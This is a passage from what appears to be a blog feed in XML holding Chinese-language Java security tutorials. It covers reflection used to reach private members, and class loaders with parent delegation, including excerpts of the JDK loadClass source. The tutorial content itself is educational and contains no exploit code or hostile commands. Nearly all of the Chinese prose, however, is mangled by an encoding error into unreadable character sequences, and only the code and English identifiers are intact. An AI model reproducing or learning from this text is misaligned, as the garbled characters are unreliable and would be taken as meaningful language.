punctuation">&#125;</span></code></pre><p>åœ¨è¿™ä¸ªå®éªŒå½“ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„Javaåå°„å´æ˜¯å¯ä»¥è®¿é—®privateçš„æ–¹æ³•å’Œå±æ€§ï¼Œç»•è¿‡ç¬¬äºŒçº§å®‰å…¨æœºåˆ¶çš„æ–¹æ³•ï¼ŒåŸç†æœ¬è´¨æ˜¯å®˜å…µè®¿é—®å®‰å…¨æ£€æŸ¥ã€‚</p><h3 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>åœ¨å®é™…åˆ©ç”¨åœºæ™¯å½“ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨åˆ©ç”¨Javaåå°„æœºåˆ¶æ¥ç»•è¿‡ä¸€äº›å®‰å…¨æƒé™æœºåˆ¶æ£€æŸ¥ï¼Œå¦‚è·å–privateæƒé™çš„æ–¹æ³•å’Œå±æ€§ã€‚æœ¬è´¨å°±æ˜¯æˆ‘ä»¬ç»•è¿‡è®¿é—®å®‰å…¨æ£€æŸ¥ã€‚æ‰€ä»¥é€šè¿‡javaåå°„æœºåˆ¶çš„å­¦ä¹ ï¼Œèƒ½å¤Ÿä¸ºæˆ‘ä»¬ä¸ºæˆ‘ä»¬åé¢çš„javaæ¼æ´åˆ†æè°ƒè¯•ï¼Œjavaæ¼æ´pocæµ‹è¯•å’ŒæœåŠ¡ç«¯æ¨¡æ¿å¼•æ“æ³¨å…¥ç­‰æœ‰ç€ååˆ†é‡è¦çš„æ„ä¹‰ã€‚å› ä¸ºæ–‡ç« è®²çš„æ¯”è¾ƒé€šä¿—ç®€å•ï¼Œä¸»è¦æ˜¯é¢å‘å¼€å§‹æ²¡æœ‰æ¶‰åŠä¸€äº›æ¼æ´åˆ†æä¸æºç åˆ†æï¼Œåé¢javaå®‰å…¨åŸºç¡€ç³»åˆ—ä¼šæ…¢æ…¢åŠ å…¥è¿™äº›å¹¶è¯¦ç»†è®²è§£ã€‚å…¶æ¬¡å¦‚æœå¤§å®¶å¯¹æ–‡ç« æœ‰ä»€ä¹ˆé—®é¢˜å’Œè§‰å¾—éœ€è¦æ”¹è¿›çš„åœ°æ–¹ï¼Œå¯ä»¥åœ¨è¯„è®ºä¸‹æ–¹ç•™è¨€ï¼Œå¤§å®¶ä¸€èµ·æ¢è®¨äº¤æµä¸‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAå®‰å…¨åŸºç¡€--ç±»åŠ è½½å™¨ï¼ˆClassLoaderï¼‰</title>
      <link href="/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-1/"/>
      <url>/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-æ¦‚å¿µ"><a href="#0x01-æ¦‚å¿µ" class="headerlink" title="0x01 æ¦‚å¿µ"></a>0x01 æ¦‚å¿µ</h2><p>Javaç±»åŠ è½½å™¨(Java Classloader)æ˜¯Javaè¿è¡Œæ—¶ç¯å¢ƒ(Java Runtime Environment)çš„ä¸€éƒ¨åˆ†ï¼Œè´Ÿè´£åŠ¨æ€åŠ è½½Javaç±»åˆ°Javaè™šæ‹Ÿæœºçš„å†…å­˜ç©ºé—´ä¸­ï¼Œç”¨äºåŠ è½½ç³»ç»Ÿã€ç½‘ç»œæˆ–è€…å…¶ä»–æ¥æºçš„ç±»æ–‡ä»¶ã€‚Javaæºä»£ç é€šè¿‡javacç¼–è¯‘å™¨ç¼–è¯‘æˆç±»æ–‡ä»¶ï¼Œç„¶åJVMæ¥æ‰§è¡Œç±»æ–‡ä»¶ä¸­çš„å­—èŠ‚ç æ¥æ‰§è¡Œç¨‹åºã€‚</p><h2 id="0x02-ç±»æ–‡ä»¶ç¼–è¯‘æµç¨‹å›¾"><a href="#0x02-ç±»æ–‡ä»¶ç¼–è¯‘æµç¨‹å›¾" class="headerlink" title="0x02 ç±»æ–‡ä»¶ç¼–è¯‘æµç¨‹å›¾"></a>0x02 ç±»æ–‡ä»¶ç¼–è¯‘æµç¨‹å›¾</h2><p><img src="1.png" loading="lazy"></p><p>æˆ‘ä»¬ä»¥ä¸Šå›¾ä¸ºä¾‹å­ï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªClassLoaderTest.javaæ–‡ä»¶è¿è¡Œï¼Œç»è¿‡javacç¼–è¯‘ï¼Œç„¶åç”ŸæˆClassLoaderTest.classæ–‡ä»¶ã€‚è¿™ä¸ªjavaæ–‡ä»¶å’Œç”Ÿæˆçš„classæ–‡ä»¶éƒ½æ˜¯å­˜å‚¨åœ¨æˆ‘ä»¬çš„ç£ç›˜å½“ä¸­ã€‚ä½†å¦‚æœæˆ‘ä»¬éœ€è¦å°†ç£ç›˜ä¸­çš„classæ–‡ä»¶åœ¨javaè™šæ‹Ÿæœºå†…å­˜ä¸­è¿è¡Œï¼Œéœ€è¦ç»è¿‡ä¸€ç³»åˆ—çš„ç±»çš„ç”Ÿå‘½å‘¨æœŸï¼ˆåŠ è½½ã€è¿æ¥ï¼ˆéªŒè¯â€“&gt;å‡†å¤‡â€“&gt;è§£æï¼‰å’Œåˆå§‹åŒ–æ“ä½œï¼Œæœ€åå°±æ˜¯æˆ‘ä»¬çš„javaè™šæ‹Ÿæœºå†…å­˜ä½¿ç”¨è‡ªèº«æ–¹æ³•åŒºä¸­å­—èŠ‚ç äºŒè¿›åˆ¶æ•°æ®å»å¼•ç”¨å †åŒºçš„Classå¯¹è±¡ã€‚</p><p>é€šè¿‡è¿™ä¸ªæµç¨‹å›¾ï¼Œæˆ‘ä»¬å°±å¾ˆæ¸…æ¥šåœ°äº†è§£åˆ°ç±»çš„åŠ è½½å°±æ˜¯ç”±javaç±»åŠ è½½å™¨å®ç°çš„ï¼Œä½œç”¨å°†ç±»æ–‡ä»¶è¿›è¡ŒåŠ¨æ€åŠ è½½åˆ°javaè™šæ‹Ÿæœºå†…å­˜ä¸­è¿è¡Œã€‚</p><h2 id="0x03-åº”ç”¨åœºæ™¯"><a href="#0x03-åº”ç”¨åœºæ™¯" class="headerlink" title="0x03 åº”ç”¨åœºæ™¯"></a>0x03 åº”ç”¨åœºæ™¯</h2><h3 id="1ã€èµ„æºéš”ç¦»"><a href="#1ã€èµ„æºéš”ç¦»" class="headerlink" title="1ã€èµ„æºéš”ç¦»"></a>1ã€èµ„æºéš”ç¦»</h3><p>å®ç°ä¸åŒé¡¹ç›®æˆ–è€…åŒä¸€ä¸ªé¡¹ç›®ä¸Šçš„ä¸åŒç‰ˆæœ¬çš„jaråŒ…éš”ç¦»ï¼Œé¿å…é›†ç¾¤é”™è¯¯æˆ–è€…å†²çªçš„äº§ç”Ÿã€‚</p><h3 id="2ã€çƒ­éƒ¨ç½²"><a href="#2ã€çƒ­éƒ¨ç½²" class="headerlink" title="2ã€çƒ­éƒ¨ç½²"></a>2ã€çƒ­éƒ¨ç½²</h3><p>å¯¹äºJavaåº”ç”¨ç¨‹åºæ¥è¯´ï¼Œçƒ­éƒ¨ç½²å°±æ˜¯åœ¨è¿è¡Œæ—¶æ›´æ–°Javaç±»æ–‡ä»¶ã€‚åœ¨åŸºäºJavaçš„åº”ç”¨æœåŠ¡å™¨å®ç°çƒ­éƒ¨ç½²çš„è¿‡ç¨‹ä¸­ï¼Œç±»è£…å…¥å™¨æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ã€‚ç±»è£…å…¥å™¨ä¸èƒ½é‡æ–°è£…å…¥ä¸€ä¸ªå·²ç»è£…å…¥çš„ç±»ï¼Œä½†åªè¦ä½¿ç”¨ä¸€ä¸ªæ–°çš„ç±»è£…å…¥å™¨å®ä¾‹ï¼Œå°±å¯ä»¥å°†ç±»å†æ¬¡è£…å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚è¿™æ ·æˆ‘ä»¬åº”ç”¨æ­£åœ¨è¿è¡Œçš„æ—¶å€™å‡çº§è½¯ä»¶ï¼Œå´ä¸éœ€è¦é‡æ–°å¯åŠ¨åº”ç”¨ã€‚</p><h3 id="3ã€ä»£ç ä¿æŠ¤"><a href="#3ã€ä»£ç ä¿æŠ¤" class="headerlink" title="3ã€ä»£ç ä¿æŠ¤"></a>3ã€ä»£ç ä¿æŠ¤</h3><p>æˆ‘ä»¬å¯ä»¥å¯¹å­—èŠ‚ç æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå†ä½¿ç”¨ç‰¹å®šçš„ClassLoaderè§£å¯†æ–‡ä»¶å†…å®¹ï¼Œå†åŠ è½½è¿™äº›å­—èŠ‚ç æ–‡ä»¶ã€‚è¿™æ ·å°±èƒ½å¤Ÿå®ç°å¯¹æˆ‘ä»¬çš„ä»£ç é¡¹ç›®åŠ å¯†ä¿æŠ¤ï¼Œåˆ«äººæ— æ³•è¿›è¡Œåç¼–è¯‘æŸ¥çœ‹æºä»£ç ä¿¡æ¯ã€‚</p><h2 id="0x04-ç±»åŠ è½½å™¨åˆ†ç±»"><a href="#0x04-ç±»åŠ è½½å™¨åˆ†ç±»" class="headerlink" title="0x04 ç±»åŠ è½½å™¨åˆ†ç±»"></a>0x04 ç±»åŠ è½½å™¨åˆ†ç±»</h2><p>åœ¨ç®€å•äº†è§£çš„ç±»åŠ è½½å™¨çš„æ¦‚å¿µä½œç”¨ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹javaä¸­ç±»åŠ è½½å™¨çš„åˆ†ç±»ã€‚ç±»åŠ è½½å™¨å¤§è‡´åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯JVMè‡ªå¸¦çš„ç±»åŠ è½½å™¨ï¼Œåˆ†åˆ«ä¸ºå¼•å¯¼ç±»åŠ è½½å™¨ã€æ‰©å±•ç±»åŠ è½½å™¨å’Œç³»ç»Ÿç±»åŠ è½½å™¨ã€‚å¦å¤–ä¸€ç§å°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ï¼Œå¯ä»¥é€šè¿‡ç»§æ‰¿java.lang.ClassLoaderç±»çš„æ–¹å¼å®ç°è‡ªå·±çš„ç±»åŠ è½½å™¨ã€‚</p><h3 id="4-1-JVMé»˜è®¤ç±»åŠ è½½å™¨"><a href="#4-1-JVMé»˜è®¤ç±»åŠ è½½å™¨" class="headerlink" title="4.1 JVMé»˜è®¤ç±»åŠ è½½å™¨"></a>4.1 JVMé»˜è®¤ç±»åŠ è½½å™¨</h3><h4 id="4-1-1-å¼•å¯¼ç±»åŠ è½½å™¨-BootstrapClassLoader"><a href="#4-1-1-å¼•å¯¼ç±»åŠ è½½å™¨-BootstrapClassLoader" class="headerlink" title="4.1.1 å¼•å¯¼ç±»åŠ è½½å™¨(BootstrapClassLoader)"></a>4.1.1 å¼•å¯¼ç±»åŠ è½½å™¨(BootstrapClassLoader)</h4><p>å¼•å¯¼ç±»åŠ è½½å™¨(BootstrapClassLoader)ï¼Œåº•å±‚åŸç”Ÿä»£ç æ˜¯C++è¯­è¨€ç¼–å†™ï¼Œå±äºjvmä¸€éƒ¨åˆ†ï¼Œä¸ç»§æ‰¿java.lang.ClassLoaderç±»ï¼Œä¹Ÿæ²¡æœ‰çˆ¶åŠ è½½å™¨ï¼Œä¸»è¦è´Ÿè´£åŠ è½½æ ¸å¿ƒjavaåº“(å³JVMæœ¬èº«)ï¼Œå­˜å‚¨åœ¨&#x2F;jre&#x2F;lib&#x2F;rt.jarç›®å½•å½“ä¸­ã€‚(åŒæ—¶å¤„äºå®‰å…¨è€ƒè™‘ï¼ŒBootstrapClassLoaderåªåŠ è½½åŒ…åä¸ºjavaã€javaxã€sunç­‰å¼€å¤´çš„ç±»)ã€‚</p><p>è¿™é‡Œä»¥æˆ‘çš„ç”µè„‘ä¸­jdk1.7ä¸ºä¾‹ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°&#x2F;jre&#x2F;lib&#x2F;rt.jarç›®å½•ï¼Œè¿™é‡Œé¢çš„ç±»éƒ½æ˜¯ç”±BootstrapClassLoaderæ¥åŠ è½½ã€‚</p><p><img src="2.png" loading="lazy"></p><p>ä¹‹åæˆ‘ä»¬ä½¿ç”¨Objectç±»ä¸ºä¾‹ï¼Œçœ‹çœ‹å…¶æ˜¯å¦å­˜åœ¨çˆ¶åŠ è½½å™¨ã€‚å› ä¸ºObjectç±»æ˜¯æ‰€æœ‰å­ç±»çš„çˆ¶ç±»ï¼Œå½’å±äºBootstrapClassLoaderã€‚å‘ç°å¹¶æ²¡æœ‰çˆ¶ç±»åŠ è½½å™¨ï¼Œç»“æœä¸ºnullã€‚</p><p><img src="3.png" loading="lazy"></p><h4 id="4-1-2-æ‰©å±•ç±»åŠ è½½å™¨-ExtensionsClassLoader"><a href="#4-1-2-æ‰©å±•ç±»åŠ è½½å™¨-ExtensionsClassLoader" class="headerlink" title="4.1.2 æ‰©å±•ç±»åŠ è½½å™¨(ExtensionsClassLoader)"></a>4.1.2 æ‰©å±•ç±»åŠ è½½å™¨(ExtensionsClassLoader)</h4><p>æ‰©å±•ç±»åŠ è½½å™¨(ExtensionsClassLoader)ï¼Œç”±sun.misc.Launcher$ExtClassLoaderç±»å®ç°ï¼Œç”¨æ¥åœ¨&#x2F;jre&#x2F;lib&#x2F;extæˆ–è€…java.ext.dirsä¸­æŒ‡æ˜çš„ç›®å½•åŠ è½½javaçš„æ‰©å±•åº“ã€‚Javaè™šæ‹Ÿæœºä¼šæä¾›ä¸€ä¸ªæ‰©å±•åº“ç›®å½•ï¼Œæ­¤åŠ è½½å™¨åœ¨ç›®å½•é‡Œé¢æŸ¥æ‰¾å¹¶åŠ è½½javaç±»ã€‚</p><p>ä»¥æˆ‘çš„ç”µè„‘ä¸ºä¾‹ï¼Œè¿™ä¸ªç›®å½•ä¸‹çš„jaråŒ…éƒ½æ˜¯ç”±ExtensionsClassLoaderè¿›è¡ŒåŠ è½½ã€‚</p><p><img src="4.png" loading="lazy"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸€ä¸ªzipfs.jaråŒ…ï¼Œç„¶åæŸ¥çœ‹ä¸‹å…¶jarä¸­çš„ZipPathç±»åŠ è½½å™¨ï¼Œå‘ç°å­˜åœ¨äºExtensionsClassLoaderã€‚</p><p><img src="5.png" loading="lazy"></p><h4 id="4-1-3-Appç±»åŠ è½½å™¨-ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰"><a href="#4-1-3-Appç±»åŠ è½½å™¨-ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰" class="headerlink" title="4.1.3 Appç±»åŠ è½½å™¨&#x2F;ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰"></a>4.1.3 Appç±»åŠ è½½å™¨&#x2F;ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰</h4><p>Appç±»åŠ è½½å™¨&#x2F;ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰ï¼Œç”±sun.misc.Launcher$AppClassLoaderå®ç°ï¼Œä¸€èˆ¬é€šè¿‡é€šè¿‡(java.class.pathæˆ–è€…Classpathç¯å¢ƒå˜é‡)æ¥åŠ è½½Javaç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„classpathè·¯å¾„ã€‚é€šå¸¸æˆ‘ä»¬æ˜¯ä½¿ç”¨è¿™ä¸ªåŠ è½½ç±»æ¥åŠ è½½Javaåº”ç”¨ç±»ï¼Œå¯ä»¥ä½¿ç”¨ClassLoader.getSystemClassLoader()æ¥è·å–å®ƒã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æœ¬èº«å†™çš„ClassLoaderTestç±»è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å­˜åœ¨äºAppClassLoaderã€‚</p><p><img src="6.png" loading="lazy"></p><h4 id="4-2-è‡ªå®šä¹‰ç±»åŠ è½½å™¨-UserDefineClassLoader"><a href="#4-2-è‡ªå®šä¹‰ç±»åŠ è½½å™¨-UserDefineClassLoader" class="headerlink" title="4.2 è‡ªå®šä¹‰ç±»åŠ è½½å™¨(UserDefineClassLoader)"></a>4.2 è‡ªå®šä¹‰ç±»åŠ è½½å™¨(UserDefineClassLoader)</h4><p>è‡ªå®šä¹‰ç±»åŠ è½½å™¨(UserDefineClassLoader)ï¼Œé™¤äº†ä¸Šè¿°javaè‡ªå¸¦æä¾›çš„ç±»åŠ è½½å™¨ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ç»§æ‰¿java.lang.ClassLoaderç±»çš„æ–¹å¼å®ç°è‡ªå·±çš„ç±»åŠ è½½å™¨ã€‚å…·ä½“å®ç°æ–¹æ³•æˆ‘ä»¬ç­‰ä¸‹å•ç‹¬è®²è§£ã€‚</p><h2 id="0x05-åŒäº²å§”æ´¾æœºåˆ¶"><a href="#0x05-åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="0x05 åŒäº²å§”æ´¾æœºåˆ¶"></a>0x05 åŒäº²å§”æ´¾æœºåˆ¶</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨JVMé»˜è®¤ä¸‰ç§ç±»åŠ è½½å™¨è¿›è¡Œç›¸äº’é…åˆä½¿ç”¨ï¼Œä¸”æ˜¯æŒ‰éœ€åŠ è½½æ–¹å¼ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦ä½¿ç”¨è¯¥ç±»çš„æ—¶å€™ï¼Œæ‰ä¼šå°†ç”Ÿæˆçš„classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜å½“ä¸­ç”Ÿæˆclasså¯¹è±¡è¿›è¡Œä½¿ç”¨ï¼Œä¸”åŠ è½½è¿‡ç¨‹ä½¿ç”¨çš„æ˜¯åŒäº²å§”æ´¾æ¨¡å¼ï¼ŒåŠæŠŠéœ€è¦åŠ è½½çš„ç±»äº¤ç”±çˆ¶åŠ è½½å™¨è¿›è¡Œå¤„ç†ã€‚</p><p>æ¦‚å¿µæœ‰ç‚¹ç»•ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹ç±»åŠ è½½å™¨å§”æ´¾å…³ç³»</p><p><img src="7.png" loading="lazy"></p><p>å¦‚ä¸Šå›¾ç±»åŠ è½½å™¨å±‚æ¬¡å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç§°ä¸ºç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æ¨¡å‹ã€‚ä½†æ³¨æ„çš„æ˜¯ï¼Œä»–ä»¬ä¹‹é—´å¹¶ä¸æ˜¯â€ç»§æ‰¿â€ä½“ç³»ï¼Œè€Œæ˜¯å§”æ´¾ä½“ç³»ã€‚å½“ä¸Šè¿°ç‰¹å®šçš„ç±»åŠ è½½å™¨æ¥åˆ°åŠ è½½ç±»çš„è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šå…ˆå°†ä»»åŠ¡å§”æ‰˜ç»™çˆ¶ç±»åŠ è½½å™¨ï¼Œæ¥ç€è¯·æ±‚çˆ¶ç±»åŠ è½½è¿™ä¸ªç±»ï¼Œå½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½æ—¶ï¼ˆå…¶ç›®å½•æœç´ èŒƒå›´æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€è¦çš„ç±»æ—¶ï¼‰ï¼Œå­ç±»åŠ è½½å™¨æ‰ä¼šè¿›è¡ŒåŠ è½½ä½¿ç”¨ã€‚è¿™æ ·å¯ä»¥é¿å…æœ‰äº›ç±»è¢«é‡å¤åŠ è½½ã€‚</p><h3 id="5-1-åŒäº²å§”æ´¾å¥½å¤„"><a href="#5-1-åŒäº²å§”æ´¾å¥½å¤„" class="headerlink" title="5.1 åŒäº²å§”æ´¾å¥½å¤„"></a>5.1 åŒäº²å§”æ´¾å¥½å¤„</h3><p>1ã€è¿™æ ·å°±æ˜¯èƒ½å¤Ÿå®ç°æœ‰äº›ç±»é¿å…é‡å¤åŠ è½½ä½¿ç”¨ï¼Œç›´æ¥å…ˆç»™çˆ¶åŠ è½½å™¨åŠ è½½ï¼Œä¸ç”¨å­åŠ è½½å™¨å†æ¬¡é‡å¤åŠ è½½ã€‚</p><p>2ã€ä¿è¯javaæ ¸å¿ƒåº“çš„ç±»å‹å®‰å…¨ã€‚æ¯”å¦‚ç½‘ç»œä¸Šä¼ è¾“äº†ä¸€ä¸ªjava.lang.Objectç±»ï¼Œé€šè¿‡åŒäº²æ¨¡å¼ä¼ é€’åˆ°å¯åŠ¨ç±»å½“ä¸­ï¼Œç„¶åå‘ç°å…¶Objectç±»æ—©å·²è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å°±ä¸ä¼šåŠ è½½è¿™ä¸ªç½‘ç»œä¼ è¾“è¿‡æ¥çš„java.lang.Objectç±»ï¼Œä¿è¯æˆ‘ä»¬çš„javaæ ¸å¿ƒAPIåº“ä¸è¢«ç¯¡æ”¹ï¼Œå‡ºç°ç±»ä¼¼ç”¨æˆ·è‡ªå®šä¹‰java.lang.Objectç±»çš„æƒ…å†µã€‚</p><p>å‡è®¾æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªjava.langåŒ…ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªTestObjectç±»ï¼Œä½†ç”±äºåŒäº²å§”æ´¾æœºåˆ¶çš„å­˜åœ¨ï¼Œæ˜¯ä¸å…è®¸åŠ è½½è¿è¡Œçš„ã€‚</p><p><img src="8.png" loading="lazy"></p><h2 id="CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•"><a href="#CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•" class="headerlink" title="CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•"></a>CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•</h2><p>é™¤äº†ä¸Šè¿°BootstrapClassLoaderï¼Œå…¶ä»–ç±»åŠ è½½å™¨éƒ½æ˜¯ç»§æ‰¿äº†CLassLoaderç±»ï¼Œæˆ‘ä»¬å°±ä¸€èµ·çœ‹çœ‹å…¶ç±»çš„æ ¸å¿ƒæ–¹æ³•ã€‚ä»¥ä¸‹ä»£ç éƒ½æ˜¯æˆªå–äº†å…¶æ–¹æ³•çš„æºç ã€‚</p><h3 id="1ã€loadClassï¼šåŠ è½½æŒ‡å®šçš„javaç±»"><a href="#1ã€loadClassï¼šåŠ è½½æŒ‡å®šçš„javaç±»" class="headerlink" title="1ã€loadClassï¼šåŠ è½½æŒ‡å®šçš„javaç±»"></a>1ã€loadClassï¼šåŠ è½½æŒ‡å®šçš„javaç±»</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// First, check if the class has already been loaded</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">long</span> t0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// ClassNotFoundException thrown if class not found</span>                    <span class="token comment">// from the non-null parent class loader</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// If still not found, then invoke findClass in order</span>                    <span class="token comment">// to find the class.</span>                    <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// this is the defining class loader; record the stats</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getParentDelegationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTime</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClassTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addElapsedTimeFrom</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span></code></pre><p>åœ¨loadClassæ–¹æ³•ä¸­ï¼Œå®ƒå…ˆä½¿ç”¨äº†findLoadedClass(String)æ–¹æ³•æ¥æ£€æŸ¥è¿™ä¸ªç±»æ˜¯å¦è¢«åŠ è½½è¿‡ã€‚</p><p>æ¥ç€ä½¿ç”¨çˆ¶åŠ è½½å™¨è°ƒç”¨loadClassï¼ˆStringï¼‰æ–¹æ³•ï¼Œå¦‚æœçˆ¶åŠ è½½å™¨ä¸ºnullï¼Œç±»åŠ è½½å™¨åŠ è½½jvmå†…ç½®çš„åŠ è½½å™¨ã€‚</p><p>ä¹‹åå°±è°ƒç”¨findClass(String) æ–¹æ³•è£…è½½ç±»ã€‚</p><p>æœ€åé€šè¿‡ä¸Šè¿°æ­¥éª¤æˆ‘ä»¬æ‰¾åˆ°äº†å¯¹åº”çš„ç±»ï¼Œå¹¶ä¸”æ¥æ”¶åˆ°çš„resolveå‚æ•°çš„å€¼ä¸ºtrue,é‚£ä¹ˆå°±ä¼šè°ƒç”¨resolveClass(Class)æ–¹æ³•æ¥å¤„ç†ç±»ã€‚</p><h3 id="2ã€findCLassï¼šæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»"><a href="#2ã€findCLassï¼šæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»" class="headerlink" title="2ã€findCLassï¼šæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»"></a>2ã€findCLassï¼šæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token 